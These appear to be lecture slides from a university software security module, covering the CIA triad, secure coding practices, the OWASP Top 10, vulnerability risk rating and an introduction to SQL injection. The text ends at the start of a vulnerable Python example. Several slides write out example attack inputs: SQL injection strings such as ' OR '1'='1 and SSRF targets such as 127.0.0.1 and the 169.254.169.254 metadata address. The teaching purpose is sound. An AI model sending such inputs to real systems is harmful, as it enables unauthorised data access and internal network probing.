<!-- Slide number: 1 -->
# Coventry University     7021SCN- Software Security
Lecture Week 1: Foundations of Secure Coding and Vulnerabilities

### Notes:

<!-- Slide number: 2 -->
# Foundations of secure coding and vulnerabilities
In this week lectures we will be covering the following topics,  learning outcomes (LO:1-3)

Introduction to Software Security
Principles of Secure Coding
Development Secure Software Systems
Web Application Flaws
SQL Injection
XSS – Cross Site Scripting

### Notes:

<!-- Slide number: 3 -->
# Introduction to software security

### Notes:

<!-- Slide number: 4 -->
# Introduction to software security
Objectives:
By the end of this first topic, you should have a  good understanding of the concepts of software security
Understanding of the concepts of confidentiality, integrity and availability  (CIA), and how they are relevant in software development process.
Why developers consistently get basic security wrong

### Notes:

<!-- Slide number: 5 -->
# Introduction to software security
Software Security involves systematic integration of relevant securities into different stages of software development life cycle (SDLC).

It involves security integration into the planning/requirements, design, development, testing and deployment stages.

### Notes:

<!-- Slide number: 6 -->
# Introduction to software security
Taking the cognizance of security  in different stages of SDIC help us to protect software from data vulnerabilities, rather than reacting to them later.

It protect confidentiality, integrity and availability (CIA) of data from outset

### Notes:

<!-- Slide number: 7 -->
# The CIA Triad

The CIA Triangle (or Triad) is an essential information security model used since the late 1990s.
Purpose:
Helps organisations shape policies to secure data and guide system design and decision-making.

### Notes:

<!-- Slide number: 8 -->
# The CIA Triangle Elements
Confidentiality:
Protecting data from unauthorised access.

Integrity:
Ensuring data accuracy and trustworthiness.

Availability:
Ensuring authorised users can access data when needed.

### Notes:

<!-- Slide number: 9 -->
# Confidentiality
Definition:
Only authorised users and processes should access or modify data.

Example:
Data breaches such as the Adobe or Marriott breaches are common examples of loss of confidentiality.

Key Practice:
Limiting data access to authorised personnel only (e.g., lecturers only viewing relevant student information).

### Notes:

<!-- Slide number: 10 -->
# Integrity
Definition:
Data should remain accurate and trustworthy.

Threats:
Data corruption, accidental or malicious modifications.

Key Practice:
Use of checksums, backups, and restricted permissions to protect against integrity loss.

### Notes:

<!-- Slide number: 11 -->
# Availability
Definition:
Data should be available to authorised users when needed.
Threats:

Denial-of-service (DoS) attacks, hardware failures, or natural disasters can impact availability.

Key Practice:
Ensure redundancy, backups, and robust system design to guarantee availability.

### Notes:

<!-- Slide number: 12 -->
# Overlap and Conflicts
Example of Conflict:
Encryption supports confidentiality but may reduce availability if encryption keys are lost or overly complex algorithms are used.

Balancing the Triangle:
Striking the right balance between confidentiality, integrity, and availability can sometimes be challenging.

### Notes:

<!-- Slide number: 13 -->

# Why developers consistently get basic security wrong

### Notes:

<!-- Slide number: 14 -->
# Why developers consistently get basic security wrong

Secure coding is high imperative to software  development.

However, many developers/programmers usually get basic security wrong.

### Notes:

<!-- Slide number: 15 -->
# Why developers consistently get basic security wrong
There are several reasons  for this, which may include:

Pressure for fast delivery –Most developers often deprioritise securities to other functional features of software.

They most neglect basic security features  such as validating the input into their software in order to  deliver quick software.

### Notes:

<!-- Slide number: 16 -->
# Why developers consistently get basic security wrong
Inadequate specialized security knowledge- They lack specialized knowledge in security, such as cybersecurity knowledge that may help to improve the overall security of the software.

### Notes:

<!-- Slide number: 17 -->
# Why developers consistently get basic security wrong
Complexity due to third-party dependencies – Most software often depend on other third-party software  and developers often do not know the codebases of the software they are building on, making it difficult to make it updated and secure.

### Notes:

<!-- Slide number: 18 -->
# Why developers consistently get basic security wrong
Inadequate training – Security is mostly ineffective or not focus on real-world scenario

Misaligned incentives and culture of companies – Securities are often not ingrained in companies’ culture which leads to developers not investing much time in it.

### Notes:

<!-- Slide number: 19 -->
# Activity (3-5 mins)
In a group of three. Discuss the practical ways you an maintain balance among confidentiality, integrity and availability on a real-world software.

### Notes:

<!-- Slide number: 20 -->
# Principles of secure coding

### Notes:

<!-- Slide number: 21 -->
# Principles of secure coding
Objectives:
Understand foundational principles and practices for secure coding
Understand the concept of least privilege in software security

### Notes:

<!-- Slide number: 22 -->
# Principles of secure coding
Secure coding centres on intentionally and proactively building security into every stage of software development lifecycle.

To prevent vulnerabilities such as Cross Site Scripting (XSS) and SQL injection before production level.

### Notes:

<!-- Slide number: 23 -->
# Foundational Principles and practices
The following foundational principles and practices are widely use in industries:
Least Privilege – It grant users and processes minimum privileges (permission) to perform the necessary tasks.
Secure Defaults – Through delivering software with the most secure settings that are enabled by defaults.

### Notes:

<!-- Slide number: 24 -->
# Foundational Principles and practices
For example, requiring strong passwords and using HTTPS.
Economy of Mechanism – That is keeping security designs simple, easily understood, to reduce the chances of errors.

Indepth Defence – Having layers of multiple security control so that if one fails, others provide backup.

### Notes:

<!-- Slide number: 25 -->
# Foundational Principles and practices
Secured  Failure – Which ensures that if a system fails or encounters errors, it defaults to its most secure state, e.g. denying access rather than granting it.

### Notes:

<!-- Slide number: 26 -->
# Input validation
Many programmers naively trust their users and program input
This could be input directly from users, files and even other parts  of  your program
Putting so much trust in these input could corrupt our program, give an unexpected  errors or crash

### Notes:

<!-- Slide number: 27 -->
# Input validation (least privilege)
In this principle, you should treat all data from external sources as untrusted
For example, validate for type,
Length,
Format, and
Range, using the deny-by-default (allowlist) approach

### Notes:

<!-- Slide number: 28 -->
# Output encoding
Software developers should ensure that they encode the output data from their programmes/software

They should ensure  that they encode it before rendering it in different contexts, such as HTML, URL, JavaScript

### Notes:

<!-- Slide number: 29 -->
# Output encoding
This ensures that the data content are prevented from malicious attacks

### Notes:

<!-- Slide number: 30 -->
# Activity (3-5 mins)
Describe a real-world development example where you can apply the principles of least privilege and in-depth defence.

### Notes:

<!-- Slide number: 31 -->
# Developing secure software systems

### Notes:

<!-- Slide number: 32 -->
# Developing secure software systems
Objectives:
Upon completion of this topic. you should be able to:
Understand the importance of using secure coding principles and practices
Explain the different variations of practices and principles introduced
For example the two different practices introduced by OWASP and CERT
Describe the operational practices and security layers involved in the system development process

### Notes:

<!-- Slide number: 33 -->
# Secure programming
What is the Secure Programming?

Secure Programming or Coding refers to the process of writing source code in such a way that it incorporates the best security principles for the development of the intended system.

But why we should use Secure Programming?

It can be used to limit the programming errors/bugs that can potentially result in system vulnerabilities and risks, increasing the system security and lowering the chance for attacks
Mitigation of backdoors, loopholes and other vulnerabilities.

### Notes:

<!-- Slide number: 34 -->
# Bad Coding Practices – An Overview
In real life, there usually exist several different reasons why something can go wrong (e.g. an accident/incident), the same happens with programming.

For example, in real life, a car accident between two vehicles can occur because of one of the drivers is not complying with the driving rules, which makes him dangerous and the car vulnerable and prone to accident.

Most of the reasons that make a programme fail are related to either a poor design or coding process.

The causes of poor coding very often derive from the fact that developers do not follow some of the programming conventions and rules agreed.

### Notes:

<!-- Slide number: 35 -->
# Examples of bad coding practices
The most common errors noted in programming and are considered as bad practices are:
Presence of typos in the code
No proper structure and formatting of the code
No use of comments in the code
No proper declaration of values
Use of magic numbers
Logic errors in the code
Complex and lengthy code
Non-modular code
All these reason and/or others can easily affect the security of the system under development as the contribute to the existence of bugs that make the application vulnerable.

### Notes:

<!-- Slide number: 36 -->

# Real cases of poor programming

### Notes:

<!-- Slide number: 37 -->

![](Picture2.jpg)
# Wannacry – a worldwide attack
WannaCry is a ransomware attack conducted against thousands of computers around the world. It has been reported that more than 300000 computer in several countries were “infected” by the attack.
United Kingdom was among those countries, hitting large organisation like the NHS

The attack was initiated through a worm that contained a malware software that locks up the system files and encrypts them. The attack asks for ransom in bitcoin in order to regain access to the files, but without any guarantee that this will happen.

WannaCry was based on an EternalBlue exploit that is Microsoft Windows’ Server Message Block (SMB) protocol and installed and executed the malware software through the DoublePulsar backdoor tool.

### Notes:

<!-- Slide number: 38 -->
# Nest learning thermostat – a “smart” fail

![](Picture2.jpg)
Nest Learning Thermostat is a smart thermostat developed by Nest Labs in order to optimise the energy usage of homes and businesses’ heating systems.

In 2016, a software bug caused the failure of the thermostat, which stopped working leaving many homes and businesses without heating. Specifically, the problem started after a software update went wrong.

### Notes:

<!-- Slide number: 39 -->

# Secure coding practices

### Notes:

<!-- Slide number: 40 -->
# Variations of secure programming practices
It is worth noticing that there are different “approaches” for the secure programming process introduced by different organisations/persons, but none of them has been adopted as a universal approach yet.

Open Web Application Security Project (OWASP) introduces many different secure coding practices in its guide focusing on certain programming areas of the system to be developed.
Computer Emergency Response Team (CERT) presents its top ten secure programming practices and principles.

In this talk, we are going to introduce some key practices that can improve coding,  enhancing in this way the system security during the development stage.

### Notes:

<!-- Slide number: 41 -->
# Key secure coding practices
The list below presents some of the key coding practices, the application of which can improve/enhance the system security:

Validation of input
Error Handling and Logging
Database security
Memory management
Data protection

### Notes:

<!-- Slide number: 42 -->
# Input validation
Input Validation is the process of testing the input data that is fed to the system. Specifically, it is examined whether that data is of the appropriate form or supported by the system software.

Input validation usually occurs when data is received from an external party, especially if the data is from untrusted sources.

Common practices for input validation include:
There should be a centralized input validation routine for the application
All validation failures should result in input rejection

Note that incorrect input validation can lead to injection attacks, memory leakage, and compromised systems.

### Notes:

<!-- Slide number: 43 -->
# Error handling and logging
This practice suggests some certain actions that should be considered during the programming process of a system in case of an error occurrence.

Thus, for the error handling, the following should be actions should be taken:
No disclosure of information in error responses such as account or system details
Use error handlers that do not reveal debugging trace information
Properly free allocated memory when error conditions occur
Error handling logic associated with security controls should deny access by default

Now, for the error logging, the system should:
Log all input validation failures
Log all authentication attempts, especially failures
Log all access control failures
Log all system exceptions

### Notes:

<!-- Slide number: 44 -->
# Database security
As the database is one of the most important assets of a system, we need to shield it with the appropriate security level, which can be achieved if we follow certain secure practices, such as:
Use strongly typed parameterized queries
Ensure that variables are strongly typed
The application should use the lowest possible level of privilege when accessing the database
Use secure credentials for database access
Turn off all unnecessary database functionality
Disable any default accounts that are not required

### Notes:

<!-- Slide number: 45 -->
# Memory management
Another coding practice that can definitely contribute towards the improvement of the system security is the proper memory management.

A proper memory management should apply the following:
Double check that the buffer size is as large as specified
Check buffer boundaries if calling the function in a loop and make sure there is no danger of writing past the allocated space
Use non-executable stacks when available
Avoid the use of known vulnerable functions (e.g., printf, strcat, strcpy etc.)
Properly free allocated memory upon the completion of functions and at all exit points

### Notes:

<!-- Slide number: 46 -->
# Data protection
For the proper protection of the data used in a system, many different security practices should be taken into consideration during the programming phase. The list below includes typical examples of such practices:

Implement least privilege, restrict users to only the functionality, data and system information that is required to perform their tasks
Encrypt highly sensitive stored information, like authentication verification data.
Protect server-side source-code from being downloaded by a user
Do not store passwords, connection strings or other sensitive information in clear text or in any non-cryptographically secure manner.
Remove comments in user accessible production code that may reveal backend system or other sensitive information
Remove unnecessary application and system documentation as this can reveal useful information

### Notes:

<!-- Slide number: 47 -->

# Secure layers and operational practices in system development

### Notes:

<!-- Slide number: 48 -->
# Security layers and operational practices
As a software engineer, apart from securely developing and implementing the application, your duty is to ensure that this application is deployed in a secure environment.

Note that this environment is not limited to the operating system. You also need to ensure that your application resides in a securely networked environment and one that practices secure operations practices as well.

For that reason, you need to consider different security layers and operational practices that will ensure the security of the developed application or software.

### Notes:

<!-- Slide number: 49 -->
# Network Security layers
It is worth noting that the security of most modern applications begins with the network on which they operate. To secure this network, we need to:

Allow essential network services only
Make use of secure protocols
Monitor for unauthorized activity
Deploy multiple layers of security (e.g. firewall, protocols, encryption)
Log network events

### Notes:

<!-- Slide number: 50 -->
# Operating system security layers
Once the network security is addressed, it's time to ensure the security of the operating system on which the application will be installed. In effect, the network and the operating system constitute the foundation on which the application will sit.

Thus to achieve the proper security for the operating system, we need to:

Make good use of file access control (e.g. user privileges)
Allow essential network services only
Remove what is not essential
Install all current security patches
Log operating system events

### Notes:

<!-- Slide number: 51 -->
# Application and user interface security layers
The next step involves setting up the application itself and its interface so that they are both secure in the operating system environment. To achieve this, we need to:

Use file access control
Install application in a compartmentalized environment
Enable event logging
Apply same standards to third party application/code
Use authentication and identification mechanisms

### Notes:

<!-- Slide number: 52 -->
# Operational practices
Having securely set up and configured the operating system and application, it is time to ensure that the basic operations practices are sound from a security perspective.

In order the operational practices to contribute to the security enhancement of the application, we need to:
Manage privileges
Conduct operations tasks securely
Manage configurations
Keep up to date with patches
Manage users and accounts
Test the configurations
Set up checks and balances
Conduct backups securely

### Notes:

<!-- Slide number: 53 -->
# summary

Historically, poor programming/coding has resulted in the creation of vulnerable systems that are doom to fail.
Secure programming practices can increase security with several different secure coding variations to have been introduced.

Additionally, to secure programming, consideration of different security layers and secure operation practices can ensure a secure environment for the developed application.

### Notes:

<!-- Slide number: 54 -->
# Activity (3-5 mINS)

Using a case study of any web application of your interest

Discuss on how you can integrate security into different stages of its Software Development Lifecycle (SDLC)

### Notes:

<!-- Slide number: 55 -->
# Web application flaws and vulnerabilities

### Notes:

<!-- Slide number: 56 -->
# Web application flaws and vulnerabilities
Objectives:
Understand the classification of web vulnerabilities
Understand the OWASP

### Notes:

<!-- Slide number: 57 -->
# Web application flaws and vulnerabilities
Web applications are widely accessible:
Unlike desktop applications, web applications are accessible globally, increasing the potential for exploitation.
Broader Attack Surface:
With open access, flaws are more easily discovered and exploited.
Relevance to All Software:
Many web vulnerabilities apply to traditional desktop apps as well.

### Notes:

<!-- Slide number: 58 -->
# Classification of Web Vulnerabilities
Classification Helps:
By categorizing vulnerabilities, we can systematically understand the threats facing our systems.
OWASP:
One major classification system is the OWASP Top 10, which categorizes the most prevalent and severe web vulnerabilities.
Industry Guidance:
Helps us focus our mitigation efforts on high-risk areas.

### Notes:

<!-- Slide number: 59 -->
# OWASP
What is OWASP?: The Open Web Application Security Project (OWASP) Foundation has been compiling a list of the most common web vulnerabilities since 2004.
Purpose: To provide guidance on common areas where flaws may occur and indicate the level of risk associated.
2017 Survey: Based on data from over 50,000 applications and 2.3 million vulnerabilities.
Criteria: Vulnerabilities are judged on:
Ease of Exploitability
Prevalence
Detectability
Business Impact

![](Picture2.jpg)

### Notes:

<!-- Slide number: 60 -->
# The owasp 10 top
A01: Broken Access Control 		A06: Vulnerable and Outdated Components
A02: Cryptographic Failures		 A07: Identification and Authentication Failures
A03: Injection				A08: Software and Data Integrity Failures
A04: Insecure Design			09: Security Logging and Monitoring Failures
A05: Security Misconfiguration		A10: Server-Side Request Forgery (SSRF)

### Notes:

<!-- Slide number: 61 -->
# Broken Access Control
What It Is: This is when a user can access or do things they shouldn't be able to. Think of it like a faulty door lock on a building. It's about a failure to enforce policies, meaning users can act outside of their intended permissions.
Common Examples:
Changing a URL parameter (id=123 to id=124) to see another user's invoice.
An ordinary user finding and accessing an 'admin' page just by guessing the URL.
Being able to edit or delete someone else's data when you should only be able to read it.

### Notes:

<!-- Slide number: 62 -->
# Broken Access Control
How to Prevent It:
Deny by default. This is the golden rule. Only grant access to specific roles or users explicitly.
Enforce access checks on the server-side for every request. Don't rely on the user's browser to hide a button or link.
Use user roles (e.g., 'admin', 'user', 'guest') and check that role consistently.

### Notes:

<!-- Slide number: 63 -->
# Cryptographic Failures
What It Is: This is all about mistakes in how we protect data, usually with encryption or hashing. It’s not just about data being exposed (that's the symptom), but why it was exposed—using weak, old, or no cryptography at all.
Common Examples:
Storing passwords in plain text or using an old, weak hashing algorithm like MD5.
Transmitting sensitive data (like credit card details) over http:// instead of https://.

### Notes:

<!-- Slide number: 64 -->
# Cryptographic Failures
Using old, insecure protocols like SSL 3.0 or early TLS.
Using a predictable or weak "random" key for encryption.
How to Prevent It:
Encrypt all sensitive data at rest (in the database) and in transit (over the network).
Use strong, modern algorithms and protocols (e.g., TLS 1.3, AES-256).
For passwords, use a strong, salted hashing function like Argon2 or bcrypt.

### Notes:

<!-- Slide number: 65 -->
# Injection
What It Is: This happens when an attacker sends untrusted data to an application, tricking it into running commands or accessing data it shouldn't. It’s like slipping a malicious instruction into a perfectly normal request.
Common Examples:
SQL Injection: Using a web form to send database commands (e.g., ' OR '1'='1).
Cross-Site Scripting (XSS): Injecting malicious JavaScript into a page that another user's browser then runs, letting the attacker steal their session or change the page.
Command Injection: Tricking the application into running commands on the server itself.

### Notes:

<!-- Slide number: 66 -->
# injection
How to Prevent It:
Separate data from commands. The best way is using "parameterised queries" (prepared statements) for database access.
Sanitise and validate all user input. Don't trust anything that comes from a user, an API, or any outside source.
Use modern frameworks (like React, Angular, or recent server-side frameworks) that often handle this for you by default.

### Notes:

<!-- Slide number: 67 -->
# Insecure Design
What It Is: This is a new category, and it's about flaws in the very concept of the application. It’s not a simple bug in the code, but a problem with the logic or architecture that makes it vulnerable right from the start.
Common Examples:
A password reset feature that asks for easily found information (like a date of birth) and doesn't limit guesses.
A shopping basket that calculates the final price in the user's browser (where it can be tampered with) instead of on the server.

### Notes:

<!-- Slide number: 68 -->
# Insecure Design
Not planning for "what if?" scenarios, like an attacker trying to guess 10,000 passwords a second (a credential stuffing attack).
How to Prevent It:
Threat modelling. Think like an attacker before you write any code. Ask "How could this be misused?"
Use secure design principles from the start (like "least privilege").
Build security into the entire development process, not as a last-minute check.

### Notes:

<!-- Slide number: 69 -->
# Security Misconfiguration
What It Is: This is basically human error. It’s about failing to properly set up all the different parts of your application and its environment. Think default passwords, open cloud storage, or overly helpful error messages.
Common Examples:
Leaving default usernames and passwords (e.g., 'admin'/'admin') on a database, router, or server.
An Amazon S3 bucket (cloud storage) left open for the public to read or write.

### Notes:

<!-- Slide number: 70 -->
# Security Misconfiguration
Showing detailed error messages to users, which reveal system details (e.g., "database connection failed for user 'root'..." or showing stack traces).
Forgetting to disable debug features in the live application.
How to Prevent It:
Have a repeatable, hardened build process. Don't set up servers manually if you can avoid it.
Change all default settings and passwords immediately.
Run automated scans to check for common misconfigurations.

### Notes:

<!-- Slide number: 71 -->
# Vulnerable and Outdated Components
What It Is: Modern apps are built using lots of third-party parts (libraries, frameworks, modules). This vulnerability is when one of those "parts" has a known security hole that you haven't patched.
Common Examples:
Using an old version of a JavaScript library (like jQuery or React) with a known XSS vulnerability.
Running your website on an old, unpatched version of WordPress, Drupal, or .NET.
Your application relying on a library (like the famous Log4j) that has a massive, well-known security flaw.

### Notes:

<!-- Slide number: 72 -->
# Vulnerable and Outdated Components
How to Prevent It:
Keep an inventory of all the components you use and their versions.
Scan for vulnerabilities regularly using tools (like OWASP Dependency-Check or commercial tools like Snyk/Dependabot).
Patch, patch, patch! Have a clear process for applying security updates quickly when they become available.

### Notes:

<!-- Slide number: 73 -->
# Identification and Authentication Failures
What It Is: This is all about failures in proving who you are. These problems let attackers impersonate legitimate users, either by stealing credentials or just by bypassing the login checks altogether.
Common Examples:
Allowing weak or common passwords (e.g., "password123").
Not protecting against brute-force attacks (where an attacker just guesses passwords over and over).

### Notes:

<!-- Slide number: 74 -->
# Identification and Authentication Failures
Not having Multi-Factor Authentication (MFA).
Letting session IDs be predictable or showing them in the URL, where they can be stolen.
How to Prevent It:
Enforce strong, unique passwords.
Implement Multi-Factor Authentication (MFA). This is one of the single best things you can do.
Securely manage sessions (e.g., use complex, expiring session cookies) and protect against brute-force attacks with rate limiting or account lockouts.

### Notes:

<!-- Slide number: 75 -->
# Software and Data Integrity Failures
What It Is: This is about trusting code or data without checking it's genuine. It covers flaws in auto-updates, build pipelines, and "deserialisation" (unpacking data), where an attacker can slip in malicious code.
Common Examples:
An auto-update process that downloads a new version of your software without checking its digital signature. An attacker could use this to send malware to all your users.

### Notes:

<!-- Slide number: 76 -->
# Software and Data Integrity Failures
Insecure Deserialisation: This is when an application "unpacks" data from an untrusted source, and in doing so, accidentally runs malicious code hidden inside.
A compromised build (CI/CD) pipeline that secretly injects a backdoor into your application before it's released.
How to Prevent It:
Use digital signatures or similar checks to verify all software updates, libraries, and critical data.
Don't deserialise data from untrusted sources. If you must, use safe, simple formats.
Secure your build and deployment pipeline just as you would your main application.

### Notes:

<!-- Slide number: 77 -->
# Security Logging and Monitoring Failures
What It Is: This is about being "blind and deaf" to attacks. If you're not logging the right things, you'll never know you've been breached. And if you are logging, but never look at the logs or get alerts, it's just as bad.
Common Examples:
Not logging key events like failed logins, access control failures, or high-value actions (like a password change).
Logs are generated but are not monitored, so an attack goes completely unnoticed for months.

### Notes:

<!-- Slide number: 78 -->
# Security Logging and Monitoring Failures
Logs are stored in a way that an attacker can easily access and wipe them to cover their tracks.
Alerts are so 'noisy' that the real, critical alerts get ignored.
How to Prevent It:
Log all key security events (logins, failures, admin actions, transactions).
Ensure logs are in a common format and stored securely where they can't be tampered with.
Have active monitoring and alerting in place to spot suspicious activity before it's too late.

### Notes:

<!-- Slide number: 79 -->
# Server-Side Request Forgery (SSRF)
What It Is: This is a tricky one. It's when an attacker can fool your server into making a web request to a destination it shouldn't. The server itself (which is often trusted inside your network) becomes the attacker's puppet.
Common Examples:
A feature that "generates a PDF from a URL" or "fetches a user's profile picture from a URL."
An attacker gives it an internal URL like http://127.0.0.1/admin or http://192.168.1.1/router-login.
The server (from inside the network) makes this request and sends the result back to the attacker.
This can be used to scan internal networks, attack internal services, or query cloud provider data.

### Notes:

<!-- Slide number: 80 -->
# Server-Side Request Forgery (SSRF)
How to Prevent It:
Validate all user-supplied URLs against a strict allow-list of approved domains or IP addresses.
Disable 'follow redirects' in your HTTP client. This stops a clever attacker from giving you a URL on your allow-list that then bounces the server to a forbidden internal address (like 127.0.0.1).
Isolate the feature with network controls. Run the code that fetches the URL on its own server or container. Use firewall rules to explicitly block this server from accessing internal IP ranges and cloud provider metadata addresses (like 169.254.169.254).

### Notes:

<!-- Slide number: 81 -->
# Injection Attacks
What is an Injection Attack?: Happens when untrusted data is sent to a server as part of a query or command.
Common Types:
SQL Injection (SQLi)
LDAP Injection
NoSQL Injection
Impact:
May allow attackers to execute commands or access sensitive data.
Affects systems with inadequate input validation.

https://owasp.org/www-community/Injection_Flaws

![](Picture2.jpg)

### Notes:

<!-- Slide number: 82 -->
# Broken Authentication
What is Broken Authentication?: Occurs when functions related to authentication or session management are implemented incorrectly.
Consequences:
Compromised Passwords or Session Tokens: Attackers can assume user identities, access confidential data, or perform unauthorized actions.
Account Takeover: Weak session IDs or poorly implemented session management can lead to account takeovers.
Examples:
Weak Session IDs: Easily guessable session tokens.
Credential Stuffing: Attackers use lists of stolen usernames and passwords from other sites.
Brute Force Attacks: Insufficient protection against repeated login attempts.

### Notes:

<!-- Slide number: 83 -->
# Broken Authentication
Mitigation Strategies:
Multi-Factor Authentication (MFA): Adds an extra layer of security beyond passwords.
Secure Session Management: Use strong, unique session IDs and implement session timeouts.
Password Policies: Enforce complex passwords and limit login attempts to mitigate brute force.

### Notes:

<!-- Slide number: 84 -->
# Security Misconfiguration
What is Security Misconfiguration?: Happens when application settings are insecure, either due to:
Insecure default configurations.
Leftover sample files or unused services.
Mistakes in configuration settings, leaving the application exposed.
Impact:
Attackers may leverage these misconfigurations to gain access to data or take over the server.
Best Practice:
Regularly update configurations, perform security scans, and ensure secure deployment practices.

https://owasp.org/Top10/A05_2021-Security_Misconfiguration/

![](Picture2.jpg)

### Notes:

<!-- Slide number: 85 -->
# How Do We Look for Vulnerabilities in Our Code?
Code Reviews:
Regular peer reviews to catch common vulnerabilities.
Static Analysis Tools:
Automated tools to detect security flaws during development.
Penetration Testing:
Simulating attacks on the application to identify weak points.
OWASP Best Practices:
Follow guidelines and standards outlined by OWASP to develop secure web applications.

https://owasp.org/www-project-code-review-guide/assets/OWASP_Code_Review_Guide_v2.pdf

### Notes:

<!-- Slide number: 86 -->
# Why Assess Risks in System Vulnerabilities?
Importance of Risk Assessment:
Helps prioritize efforts on vulnerabilities with the most serious impact.
Effective risk assessment allows teams to focus resources on the most critical issues, minimizing the risk of exploitation.
Key Factors Considered:
Severity: How serious is the impact on the system?
Likelihood: What is the probability of the vulnerability being exploited?
Examples:
Vulnerability 1: Low Severity, Very High Likelihood
Vulnerability 2: Very High Severity, Low Likelihood
Vulnerability 3: High Severity, High Likelihood

### Notes:

<!-- Slide number: 87 -->
# Risk Assessment Standards
Why Multiple Standards?
No single risk rating standard fits all organizations or applications.
Different organizations have different priorities and threat landscapes, so risk must be evaluated in context.
Standards provide a framework for consistency, but each organization must adapt them to their unique environment.
Common Standards:
OWASP Risk Assessment: Focuses on security from a web application perspective, assessing vulnerabilities based on likelihood and impact.
SANS Institute Approach: Emphasizes practical risk assessment with focus on exposure and severity to help prioritize remediation efforts.
CVE / CVSS Ratings: Common Vulnerabilities and Exposures (CVE) combined with Common Vulnerability Scoring System (CVSS) ratings provide a widely accepted method to communicate the severity of vulnerabilities.

### Notes:

<!-- Slide number: 88 -->
# OWASP Risk Rating Methodology
Risk Elements:
Likelihood: Based on Threat Agent Factors and Vulnerability Factors.
Threat Agent Factors: Skill Level, Motive, Opportunity, Group Size.
Vulnerability Factors: Ease of Discovery, Ease of Exploit, Awareness, Intrusion Detection.
Impact:
Technical Impact: Loss of Confidentiality, Integrity, Availability, Accountability.
Business Impact: Financial Damage, Reputation Damage, Non-Compliance, Privacy Violation.
Calculating the Score:
Likelihood and Impact are averaged to give a final risk rating ranging from Low (0-3) to High (6-9).
https://owasp.org/www-community/OWASP_Risk_Rating_Methodology

### Notes:

<!-- Slide number: 89 -->
# The SANS Institute Approach
Overview:
Severity: Assesses the potential loss or ease of exploitation.
Minor, Moderate, High Severity: Differentiates by how easily a vulnerability can be exploited and the potential loss.
Exposure: Indicates the extent to which the vulnerability affects the system.
Minor, Moderate, High Exposure: Evaluates how many system components are affected and whether it increases the risk of other vulnerabilities.
How to Use the Scores:
Severity and Exposure are combined to determine the overall risk impact on the system.

### Notes:

<!-- Slide number: 90 -->
# CVE and CVSS Standardizing Vulnerability Reporting
CVE (Common Vulnerabilities and Exposures):
A database maintained by MITRE and the US Government.
Each vulnerability is assigned a unique CVE number and scored to represent its severity.
CVSS (Common Vulnerability Scoring System):
Used to rate vulnerabilities from 0 to 10 based on factors like exploit complexity, impact on the CIA triangle, and the existence of exploit code.
This standardized scoring helps organizations understand the severity of vulnerabilities.
Examples:
CVE-2017-0144: Eternal Blue, used in WannaCry Malware.
CVE-2018-1133: "Evil Teacher" bug allowing remote code execution in Moodle.

### Notes:

<!-- Slide number: 91 -->
# Comparing Risk Calculation MethodsOWASP vs. SANS vs. CVSS
OWASP:
Combines likelihood and impact through technical and business elements to determine risk severity.
Focuses on specific threats to web applications and their potential impact on users and systems.
SANS:
Provides a high-level overview of risk, emphasizing the severity of vulnerabilities and exposure.
It is a practical approach that helps prioritize remediation efforts based on ease of exploitation and the potential scope of the impact.

### Notes:

<!-- Slide number: 92 -->
# Comparing Risk Calculation MethodsOWASP vs. SANS vs. CVSS
CVSS:
Uses a detailed scoring system with factors like attack complexity, privileges required, and user interaction to determine a score between 0-10.
It provides a standardized way to communicate the severity of vulnerabilities across different environments, making it widely accepted in the industry.

### Notes:

<!-- Slide number: 93 -->
# summary
OWASP Top 10:
Common web vulnerabilities like Injection Attacks, Broken Authentication, and XSS are critical for understanding typical application security issues.
Assessing Risks:
Use methodologies like OWASP, SANS, and CVSS to prioritize fixing vulnerabilities based on risk.

### Notes:

<!-- Slide number: 94 -->
# SQL Injection

### Notes:

<!-- Slide number: 95 -->
# Sql injection
Objectives:
What is SQL Injection
Understand the types of SQL Injections
How it works
How it can be prevented

### Notes:

<!-- Slide number: 96 -->
# Sql injection
What is SQL?
SQL (Structured Query Language) is the standard language used for interacting with relational databases.
Purpose:
SQL provides a way to communicate with databases, allowing users to retrieve, insert, update, and delete data.
Importance:
SQL’s standardisation allows widespread use across various applications for data manipulation and management.

### Notes:

<!-- Slide number: 97 -->
# WHAT IS Sql INJECTIONS?
What is SQL Injection?
SQL Injection (SQLi) is a critical web application vulnerability that allows attackers to manipulate SQL queries sent to a database, often resulting in unauthorised data access or database control.
Listed in OWASP Top 10: SQLi is consistently among the top vulnerabilities identified by the OWASP (Open Web Application Security Project), indicating its prevalence and severity.
How SQL Injection Works:
Attackers insert or "inject" malicious SQL commands into user inputs (e.g., forms, URLs) that are used directly in SQL queries without proper validation.
When executed, these commands can alter the intended query structure, allowing access, modification, or deletion of sensitive data.

### Notes:

<!-- Slide number: 98 -->
# CONDITIONS FOR SQL INJECTIONS
Direct Control Over Input
SQL Injection relies on attackers having a way to input data into the system, usually through forms, URL parameters, cookies, or HTTP headers.
Common Entry Points:
GET/POST Requests: Forms where users can enter text or data.
URL Parameters: Directly accessible through the browser's address bar, e.g., ?id=123.
Cookies/Headers: Hidden data sources manipulated by advanced attackers.
Lack of Input Validation
SQL Injection exploits systems where user input is not validated or sanitised, allowing it to affect SQL commands directly.
Why Input Validation Fails:
Developers assume user input is safe or cannot manipulate SQL queries.
Input filtering is insufficient, allowing special characters like ';--.

### Notes:

<!-- Slide number: 99 -->
# Adversary impacts of sql injections
Data Breaches:
SQLi can expose sensitive user information (e.g., usernames, passwords, financial data) by allowing attackers to retrieve all records from a database.
Data Manipulation and Deletion:
Attackers can modify or delete records, damaging data integrity and causing potential service disruptions.
Privilege Escalation:
Attackers may alter their own permissions or access higher-privilege accounts by modifying the query.

### Notes:

<!-- Slide number: 100 -->
# Types of Sql injections
Basic Types of SQL Injection:
In-Band SQL Injection (Classic): Attackers can see query results in the application's response.
Blind SQL Injection: The server doesn't reveal query results directly, so attackers use indirect methods (e.g., timing, true/false responses) to infer data.
Out-of-Band SQL Injection: Data is sent to the attacker through a different channel (e.g., an external HTTP request).
Examples of Injection Points:
Login Forms: Username and password fields vulnerable to SQLi.
Search Bars: Unfiltered input fields that use SQL for search.
URL Parameters: URLs with parameters (e.g., ?id=1) that are directly used in SQL queries.

### Notes:

<!-- Slide number: 101 -->
# Vulnerable injection points
Login Forms:
Attackers can inject SQL in fields such as username or password.
Search Fields:
Fields that dynamically construct queries based on user search terms can be vulnerable if not validated.
URL Parameters:
URL parameters can be manipulated by attackers to include SQL commands, example:
URL: http://example.com/page?id=1 OR 1=1
Headers and Cookies:
Attackers can manipulate HTTP headers or cookies, especially in applications that rely on these for database queries.

### Notes:

<!-- Slide number: 102 -->
# Example of basic Sql injection
Example of vulnerable code in Python
user_id = input("Enter your User ID: ")
